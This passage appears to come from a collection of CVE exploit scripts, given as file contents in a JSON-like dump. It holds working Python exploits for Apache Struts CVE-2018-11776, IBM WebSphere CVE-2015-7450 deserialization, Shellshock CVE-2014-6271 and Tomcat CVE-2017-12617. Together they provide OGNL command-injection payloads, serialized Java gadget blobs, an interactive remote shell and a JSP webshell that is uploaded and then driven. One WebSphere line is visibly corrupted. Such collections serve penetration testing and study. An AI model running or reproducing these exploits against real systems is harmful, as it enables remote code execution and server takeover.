target.rstrip('/')\n    if \"://\" not in target:\n        target = \"http://\" + target\n    try:\n        upload_webshell(target, url)\n    except Exception as e:\n        print(\"[-] Error: \\n\")\n        traceback.print_exc()\n", "CVE Exploits/Apache Struts 2 CVE-2018-11776.py": "#!/usr/bin/env python3\n# coding=utf-8\n# *****************************************************\n# struts-pwn: Apache Struts CVE-2018-11776 Exploit\n# Author:\n# Mazin Ahmed <Mazin AT MazinAhmed DOT net>\n# This code uses a payload from:\n# https://github.com/jas502n/St2-057\n# *****************************************************\n\nfrom __future__ import print_function\nfrom future import standard_library\nstandard_library.install_aliases()\nfrom builtins import str\nfrom builtins import range\nimport argparse\nimport random\nimport requests\nimport sys\ntry:\n    from urllib import parse as urlparse\nexcept ImportError:\n    import urllib.parse\n\n# Disable SSL warnings\ntry:\n    import requests.packages.urllib3\n    requests.packages.urllib3.disable_warnings()\nexcept Exception:\n    pass\n\nif len(sys.argv) <= 1:\n    print('[*] CVE: 2018-11776 - Apache Struts2 S2-057')\n    print('[*] Struts-PWN - @mazen160')\n    print('\\n%s -h for help.' % (sys.argv[0]))\n    exit(0)\n\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"-u\", \"--url\",\n                    dest=\"url\",\n                    help=\"Check a single URL.\",\n                    action='store')\nparser.add_argument(\"-l\", \"--list\",\n                    dest=\"usedlist\",\n                    help=\"Check a list of URLs.\",\n                    action='store')\nparser.add_argument(\"-c\", \"--cmd\",\n                    dest=\"cmd\",\n                    help=\"Command to execute. (Default: 'id')\",\n                    action='store',\n                    default='id')\nparser.add_argument(\"--exploit\",\n                    dest=\"do_exploit\",\n                    help=\"Exploit.\",\n                    action='store_true')\n\n\nargs = parser.parse_args()\nurl = args.url if args.url else None\nusedlist = args.usedlist if args.usedlist else None\ncmd = args.cmd if args.cmd else None\ndo_exploit = args.do_exploit if args.do_exploit else None\n\nheaders = {\n    'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2018-11776)',\n    # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',\n    'Accept': '*/*'\n}\ntimeout = 3\n\n\ndef parse_url(url):\n    \"\"\"\n    Parses the URL.\n    \"\"\"\n\n    # url: http://example.com/demo/struts2-showcase/index.action\n\n    url = url.replace('#', '%23')\n    url = url.replace(' ', '%20')\n\n    if ('://' not in url):\n        url = str(\"http://\") + str(url)\n    scheme = urllib.parse.urlparse(url).scheme\n\n    # Site: http://example.com\n    site = scheme + '://' + urllib.parse.urlparse(url).netloc\n\n    # FilePath: /demo/struts2-showcase/index.action\n    file_path = urllib.parse.urlparse(url).path\n    if (file_path == ''):\n        file_path = '/'\n\n    # Filename: index.action\n    try:\n        filename = url.split('/')[-1]\n    except IndexError:\n        filename = ''\n\n    # File Dir: /demo/struts2-showcase/\n    file_dir = file_path.rstrip(filename)\n    if (file_dir == ''):\n        file_dir = '/'\n\n    return({\"site\": site,\n            \"file_dir\": file_dir,\n            \"filename\": filename})\n\n\ndef build_injection_inputs(url):\n    \"\"\"\n    Builds injection inputs for the check.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n    injection_inputs = []\n    url_directories = parsed_url[\"file_dir\"].split(\"/\")\n\n    try:\n        url_directories.remove(\"\")\n    except ValueError:\n        pass\n\n    for i in range(len(url_directories)):\n        injection_entry = \"/\".join(url_directories[:i])\n\n        if not injection_entry.startswith(\"/\"):\n            injection_entry = \"/%s\" % (injection_entry)\n\n        if not injection_entry.endswith(\"/\"):\n            injection_entry = \"%s/\" % (injection_entry)\n\n        injection_entry += \"{{INJECTION_POINT}}/\"  # It will be renderred later with the payload.\n        injection_entry += parsed_url[\"filename\"]\n\n        injection_inputs.append(injection_entry)\n\n    return(injection_inputs)\n\n\ndef check(url):\n    random_value = int(''.join(random.choice('0123456789') for i in range(2)))\n    multiplication_value = random_value * random_value\n    injection_points = build_injection_inputs(url)\n    parsed_url = parse_url(url)\n    print(\"[%] Checking for CVE-2018-11776\")\n    print(\"[*] URL: %s\" % (url))\n    print(\"[*] Total of Attempts: (%s)\" % (len(injection_points)))\n    attempts_counter = 0\n\n    for injection_point in injection_points:\n        attempts_counter += 1\n        print(\"[%s/%s]\" % (attempts_counter, len(injection_points)))\n        testing_url = \"%s%s\" % (parsed_url[\"site\"], injection_point)\n        testing_url = testing_url.replace(\"{{INJECTION_POINT}}\", \"${{%s*%s}}\" % (random_value, random_value))\n        try:\n            resp = requests.get(testing_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)\n        except Exception as e:\n            print(\"EXCEPTION::::--> \" + str(e))\n            continue\n        if \"Location\" in list(resp.headers.keys()):\n            if str(multiplication_value) in resp.headers['Location']:\n                print(\"[*] Status: Vulnerable!\")\n                return(injection_point)\n    print(\"[*] Status: Not Affected.\")\n    return(None)\n\n\ndef exploit(url, cmd):\n    parsed_url = parse_url(url)\n\n    injection_point = check(url)\n    if injection_point is None:\n        print(\"[%] Target is not vulnerable.\")\n        return(0)\n    print(\"[%] Exploiting...\")\n\n    payload = \"\"\"%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{0}%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D\"\"\".format(cmd)\n\n    testing_url = \"%s%s\" % (parsed_url[\"site\"], injection_point)\n    testing_url = testing_url.replace(\"{{INJECTION_POINT}}\", payload)\n\n    try:\n        resp = requests.get(testing_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)\n    except Exception as e:\n        print(\"EXCEPTION::::--> \" + str(e))\n        return(1)\n\n    print(\"[%] Response:\")\n    print(resp.text)\n    return(0)\n\n\ndef main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit):\n    if url:\n        if not do_exploit:\n            check(url)\n        else:\n            exploit(url, cmd)\n\n    if usedlist:\n        URLs_List = []\n        try:\n            f_file = open(str(usedlist), \"r\")\n            URLs_List = f_file.read().replace(\"\\r\", \"\").split(\"\\n\")\n            try:\n                URLs_List.remove(\"\")\n            except ValueError:\n                pass\n            f_file.close()\n        except Exception as e:\n            print(\"Error: There was an error in reading list file.\")\n            print(\"Exception: \" + str(e))\n            exit(1)\n        for url in URLs_List:\n            if not do_exploit:\n                check(url)\n            else:\n                exploit(url, cmd)\n\n    print(\"[%] Done.\")\n\n\nif __name__ == \"__main__\":\n    try:\n        main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit)\n    except KeyboardInterrupt:\n        print(\"\\nKeyboardInterrupt Detected.\")\n        print(\"Exiting...\")\n        exit(0)\n", "CVE Exploits/WebSphere CVE-2015-7450.py": "#! /usr/bin/env python2\n\n#IBM WebSphere Java Object Deserialization RCE (CVE-2015-7450)\n#Based on the nessus plugin websphere_java_serialize.nasl\n#Made with <3 by @byt3bl33d3r\n\nfrom __future__ import print_function\nfrom builtins import chr\nimport requests\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nimport argparse\nimport sys\nimport base64\nfrom binascii import unhexlify\n\nparser = argparse.ArgumentParser()\nparser.add_argument('target', type=str, help='Target IP:PORT')\nparser.add_argument('command', type=str, help='Command to run on target')\nparser.add_argument('--proto', choices={'http', 'https'}, default='https', help='Send exploit over http or https (default: https)')\n\nif len(sys.argv) < 2:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\n\nif len(args.target.split(':')) != 2:\n    print('[-] Target must be in format IP:PORT')\n    sys.exit(1)\n\nif not args.command:\n    print('[-] You must specify a command to run')\n    sys.exit(1)\n\nelif args.command:\n    if len(args.command) > 254:\n        print('[-] Command must be less then 255 bytes')\n        sys.exit(1)\n\nip, port = args.target.split(':')\n\nprint('[*] Target IP: {}'.format(ip))\nprint('[*] Target PORT: {}'.format(port))\n\nserObj = unhexlifynserObj += chr(len(args.command)) + args.command\nserObj += unhexlify(\"740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A\")\n\nserObjB64 = base64.b64encode(serObj)\n\nser1 = \"rO0ABXNyAA9qYXZhLnV0aWwuU3RhY2sQ/irCuwmGHQIAAHhyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAOmNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3IuSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnTblRMyYyF8sQIABUwACGNlbGxOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAIaG9zdE5hbWVxAH4AB0wACG5vZGVOYW1lcQB+AAdMAApzZXJ2ZXJOYW1lcQB+AAdbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7eHB0AAB0AAhMYXAzOTAxM3EAfgAKcQB+AAp1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAACpzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4AB0wACGZpbGVOYW1lcQB+AAdMAAptZXRob2ROYW1lcQB+AAd4cAAAAEt0ADpjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHRFbGVtZW50dAAfSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnQuamF2YXQABjxpbml0PnNxAH4ADgAAADx0ADNjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHR0ABhKTVhDb25uZWN0b3JDb250ZXh0LmphdmF0AARwdXNoc3EAfgAOAAAGQ3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAcZ2V0Sk1YQ29ubmVjdG9yQ29udGV4dEhlYWRlcnNxAH4ADgAAA0h0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQAEmludm9rZVRlbXBsYXRlT25jZXNxAH4ADgAAArF0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQADmludm9rZVRlbXBsYXRlc3EAfgAOAAACp3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAOaW52b2tlVGVtcGxhdGVzcQB+AA4AAAKZdAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA4AAAHndAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA7/////dAAVY29tLnN1bi5wcm94eS4kUHJveHkwcHQABmludm9rZXNxAH4ADgAAAOB0ACVjb20uaWJtLndzLm1hbmFnZW1lbnQuQWRtaW5DbGllbnRJbXBsdAAUQWRtaW5DbGllbnRJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAADYdAA9Y29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5jb25maWdzZXJ2aWNlLkNvbmZpZ1NlcnZpY2VQcm94eXQAF0NvbmZpZ1NlcnZpY2VQcm94eS5qYXZhdAARZ2V0VW5zYXZlZENoYW5nZXNzcQB+AA4AAAwYdAAmY29tLmlibS53cy5zY3JpcHRpbmcuQWRtaW5Db25maWdDbGllbnR0ABZBZG1pbkNvbmZpZ0NsaWVudC5qYXZhdAAKaGFzQ2hhbmdlc3NxAH4ADgAAA/Z0AB5jb20uaWJtLndzLnNjcmlwdGluZy5XYXN4U2hlbGx0AA5XYXN4U2hlbGwuamF2YXQACHRpbWVUb0dvc3EAfgAOAAAFm3QAImNvbS5pYm0ud3Muc2NyaXB0aW5nLkFic3RyYWN0U2hlbGx0ABJBYnN0cmFjdFNoZWxsLmphdmF0AAtpbnRlcmFjdGl2ZXNxAH4ADgAACPp0ACJjb20uaWJtLndzLnNjcmlwdGluZy5BYnN0cmFjdFNoZWxsdAASQWJzdHJhY3RTaGVsbC5qYXZhdAADcnVuc3EAfgAOAAAElHQAHmNvbS5pYm0ud3Muc2NyaXB0aW5nLldhc3hTaGVsbHQADldhc3hTaGVsbC5qYXZhdAAEbWFpbnNxAH4ADv////50ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQAB2ludm9rZTBzcQB+AA4AAAA8dAAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsdAAdTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAAAldAAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbHQAIURlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAAmN0ABhqYXZhLmxhbmcucmVmbGVjdC5NZXRob2R0AAtNZXRob2QuamF2YXQABmludm9rZXNxAH4ADgAAAOp0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAKbGF1bmNoTWFpbnNxAH4ADgAAAGB0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAEbWFpbnNxAH4ADgAAAE10ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAACS3QANG9yZy5lY2xpcHNlLmVxdWlub3guaW50ZXJuYWwuYXBwLkVjbGlwc2VBcHBDb250YWluZXJ0ABhFY2xpcHNlQXBwQ29udGFpbmVyLmphdmF0ABdjYWxsTWV0aG9kV2l0aEV4Y2VwdGlvbnNxAH4ADgAAAMZ0ADFvcmcuZWNsaXBzZS5lcXVpbm94LmludGVybmFsLmFwcC5FY2xpcHNlQXBwSGFuZGxldAAVRWNsaXBzZUFwcEhhbmRsZS5qYXZhdAADcnVuc3EAfgAOAAAAbnQAPG9yZy5lY2xpcHNlLmNvcmUucnVudGltZS5pbnRlcm5hbC5hZGFwdG9yLkVjbGlwc2VBcHBMYXVuY2hlcnQAF0VjbGlwc2VBcHBMYXVuY2hlci5qYXZhdAAOcnVuQXBwbGljYXRpb25zcQB+AA4AAABPdAA8b3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmludGVybmFsLmFkYXB0b3IuRWNsaXBzZUFwcExhdW5jaGVydAAXRWNsaXBzZUFwcExhdW5jaGVyLmphdmF0AAVzdGFydHNxAH4ADgAAAXF0AC9vcmcuZWNsaXBzZS5jb3JlLnJ1bnRpbWUuYWRhcHRvci5FY2xpcHNlU3RhcnRlcnQAE0VjbGlwc2VTdGFydGVyLmphdmF0AANydW5zcQB+AA4AAACzdAAvb3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmFkYXB0b3IuRWNsaXBzZVN0YXJ0ZXJ0ABNFY2xpcHNlU3RhcnRlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAABVHQAHm9yZy5lY2xpcHNlLmNvcmUubGF1bmNoZXIuTWFpbnQACU1haW4uamF2YXQAD2ludm9rZUZyYW1ld29ya3NxAH4ADgAAARp0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AAhiYXNpY1J1bnNxAH4ADgAAA9V0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AANydW5zcQB+AA4AAAGQdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQADWxhdW5jaEVjbGlwc2VzcQB+AA4AAACjdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQABG1haW5wcHBwcHBwcHB4\"\n\nser2 = \"rO0ABXNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdACxV2ViU3BoZXJlOm5hbWU9Q29uZmlnU2VydmljZSxwcm9jZXNzPXNlcnZlcjEscGxhdGZvcm09cHJveHksbm9kZT1MYXAzOTAxM05vZGUwMSx2ZXJzaW9uPTguNS41LjcsdHlwZT1Db25maWdTZXJ2aWNlLG1iZWFuSWRlbnRpZmllcj1Db25maWdTZXJ2aWNlLGNlbGw9TGFwMzkwMTNOb2RlMDFDZWxsLHNwZWM9MS4weA==\"\n\n#This was in the nessus plugin, but wasn't used anywhwere :/\n#ser3 = \"rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgAkY29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5TZXNzaW9uJ5mLeyYSGOUCAANKAAJpZFoADnNoYXJlV29ya3NwYWNlTAAIdXNlck5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cAAAAVEDKkaUAXQAEVNjcmlwdDE1MTAzMmE0Njk0\"\n\nser4 = \"rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=\"\n\nxmlObj =\"<?xml version='1.0' encoding='UTF-8'?>\\r\\n\"\nxmlObj +='<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">\\r\\n'\nxmlObj +='<SOAP-ENV:Header ns0:JMXConnectorContext=\"{ser1}\" xmlns:ns0=\"admin\" ns0:WASRemoteRuntimeVersion=\"8.5.5.7\" ns0:JMXMessageVersion=\"1.2.0\" ns0:JMXVersion=\"1.2.0\">\\r\\n'.format(ser1=ser1)\nxmlObj +='</SOAP-ENV:Header>\\r\\n'\nxmlObj +='<SOAP-ENV:Body>\\r\\n'\nxmlObj +='<ns1:invoke xmlns:ns1=\"urn:AdminService\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\\r\\n'\nxmlObj +='<objectname xsi:type=\"ns1:javax.management.ObjectName\">{ser2}</objectname>\\r\\n'.format(ser2=ser2)\nxmlObj +='<operationname xsi:type=\"xsd:string\">getUnsavedChanges</operationname>\\r\\n'\nxmlObj +='<params xsi:type=\"ns1:[Ljava.lang.Object;\">{serObjB64}</params>\\r\\n'.format(serObjB64=serObjB64)\nxmlObj +='<signature xsi:type=\"ns1:[Ljava.lang.String;\">{ser4}</signature>\\r\\n'.format(ser4=ser4)\nxmlObj +='</ns1:invoke>\\r\\n'\nxmlObj +='</SOAP-ENV:Body>\\r\\n'\nxmlObj +='</SOAP-ENV:Envelope>'\n\nheaders = {'Content-Type': 'text/xml; charset=utf-8',\n           'SOAPAction': 'urn:AdminService'}\n\nr = requests.post('{}://{}:{}'.format(args.proto, ip, port), data=xmlObj, headers=headers, verify=False)\nprint('[*] HTTPS request sent successfully')\n", "CVE Exploits/Shellshock CVE-2014-6271.py": "#!/usr/bin/python\n\n# Successful Output:\n# # python shell_shocker.py <VulnURL>\n# [+] Attempting Shell_Shock - Make sure to type full path\n# ~$ /bin/ls /\n# bin\n# boot\n# dev\n# etc\n# ..\n# ~$ /bin/cat /etc/passwd\n\nfrom __future__ import print_function\nfrom future import standard_library\nstandard_library.install_aliases()\nfrom builtins import input\nimport sys, urllib.request, urllib.error, urllib.parse\n\nif len(sys.argv) != 2:\n        print(\"Usage: shell_shocker <URL>\")\n        sys.exit(0)\n\nURL=sys.argv[1]\nprint(\"[+] Attempting Shell_Shock - Make sure to type full path\")\n\nwhile True:\n        command=input(\"~$ \")\n        opener=urllib.request.build_opener()\n        opener.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ; '+command)]\n        try:\n                response=opener.open(URL)\n                for line in response.readlines():\n                        print(line.strip())\n        except Exception as e: print(e)\n\n", "CVE Exploits/Tomcat CVE-2017-12617.py": "#!/usr/bin/python\n# From https://github.com/cyberheartmi9/CVE-2017-12617/blob/master/tomcat-cve-2017-12617.py\n\"\"\"\n./cve-2017-12617.py [options]\n\n\noptions:\n\n\n-u ,--url [::] check target url if it's vulnerable\n-p,--pwn [::] generate webshell and upload it\n-l,--list [::] hosts list\n\n\n[+]usage:\n\n\n./cve-2017-12617.py -u http://127.0.0.1\n./cve-2017-12617.py --url http://127.0.0.1\n./cve-2017-12617.py -u http://127.0.0.1 -p pwn\n./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn\n./cve-2017-12617.py -l hotsts.txt\n./cve-2017-12617.py --list hosts.txt\n\"\"\"\nfrom __future__ import print_function\nfrom builtins import input\nfrom builtins import str\nfrom builtins import object\nimport requests\nimport re\nimport signal\nfrom optparse import OptionParser\n\n\n\n\n\n\n\n\nclass bcolors(object):\n    HEADER = '\\033[95m'\n    OKBLUE = '\\033[94m'\n    OKGREEN = '\\033[92m'\n    WARNING = '\\033[93m'\n    FAIL = '\\033[91m'\n    ENDC = '\\033[0m'\n    BOLD = '\\033[1m'\n    UNDERLINE = '\\033[4m'\n\n\n\n\nbanner=\"\"\"\n\n\n   _______      ________    ___   ___  __ ______     __ ___   __ __ ______\n  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |____  |   /_ |__ \\ / //_ |____  |\n | |     \\ \\  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /\n | |      \\ \\/ / |  __|______/ /| | | || |  / /______| | / / '_ \\| |  / /\n | |____   \\  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /\n  \\_____|   \\/   |______|  |____|\\___/ |_|/_/        |_|____\\___/|_|/_/\n\n\n\n[@intx0x80]\n\n\"\"\"\n\n\n\n\n\ndef signal_handler(signal, frame):\n\n    print (\"\\033[91m\"+\"\\n[-] Exiting\"+\"\\033[0m\")\n\n    exit()\n\nsignal.signal(signal.SIGINT, signal_handler)\n\n\n\n\ndef removetags(tags):\n    remove = re.compile('<.*?>')\n    txt = re.sub(remove, '\\n', tags)\n    return txt.replace(\"\\n\\n\\n\",\"\\n\")\n\n\ndef getContent(url,f):\n    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}\n    re=requests.get(str(url)+\"/\"+str(f), headers=headers)\n    return re.content\n\ndef createPayload(url,f):\n    evil='<% out.println(\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\");%>'\n    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}\n    req=requests.put(str(url)+str(f)+\"/\",data=evil, headers=headers)\n    if req.status_code==201:\n        print(\"File Created ..\")\n\n\ndef RCE(url,f):\n    EVIL=\"\"\"<FORM METHOD=GET ACTION='{}'>\"\"\".format(f)+\"\"\"\n    <INPUT name='cmd' type=text>\n    <INPUT type=submit value='Run'>\n    </FORM>\n    <%@ page import=\"java.io.*\" %>\n    <%\n   String cmd = request.getParameter(\"cmd\");\n   String output = \"\";\n   if(cmd != null) {\n      String s = null;\n      try {\n         Process p = Runtime.getRuntime().exec(cmd,null,null);\n         BufferedReader sI = new BufferedReader(new\nInputStreamReader(p.getInputStream()));\n         while((s = sI.readLine()) != null) { output += s+\"</br>\"; }\n      }  catch(IOException e) {   e.printStackTrace();   }\n   }\n%>\n<pre><%=output %></pre>\"\"\"\n\n\n\n    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}\n\n    req=requests.put(str(url)+f+\"/\",data=EVIL, headers=headers)\n\n\n\ndef shell(url,f):\n\n    while True:\n        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}\n        cmd=input(\"$ \")\n        payload={'cmd':cmd}\n        if cmd==\"q\" or cmd==\"Q\":\n            break\n\n        re=requests.get(str(url)+\"/\"+str(f),params=payload,headers=headers)\n        re=str(re.content)\n        t=removetags(re)\n        print(t)\n\n\n\n\n\n#print bcolors.HEADER+ banner+bcolors.ENDC\n\nparse=OptionParser(\n\n\nbcolors.HEADER+\"\"\"\n\n\n   _______      ________    ___   ___  __ ______     __ ___   __ __ ______\n  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |____  |   /_ |__ \\ / //_ |____  |\n | |     \\ \\  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /\n | |      \\ \\/ / |  __|______/ /| | | || |  / /______| | / / '_ \\| |  / /\n | |____   \\  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /\n  \\_____|   \\/   |______|  |____|\\___/ |_|/_/        |_|____\\___/|_|/_/\n\n\n\n\n./cve-2017-12617.py [options]\n\noptions:\n\n-u ,--url [::] check target url if it's vulnerable\n-p,--pwn  [::] generate webshell and upload it\n-l,--list [::] hosts list\n\n[+]usage:\n\n./cve-2017-12617.py -u http://127.0.0.1\n./cve-2017-12617.py --url http://127.0.0.1\n./cve-2017-12617.py -u http://127.0.0.1 -p pwn\n./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn\n./cve-2017-12617.py -l hotsts.txt\n./cve-2017-12617.py --list hosts.txt\n\n\n[@intx0x80]\n\n\"\"\"+bcolors.ENDC\n\n    )\n\n\nparse.add_option(\"-u\",\"--url\",dest=\"U\",type=\"string\",help=\"Website Url\")\nparse.add_option(\"-p\",\"--pwn\",dest=\"P\",type=\"string\",help=\"generate webshell and upload it\")\nparse.add_option(\"-l\",\"--list\",dest=\"L\",type=\"string\",help=\"hosts 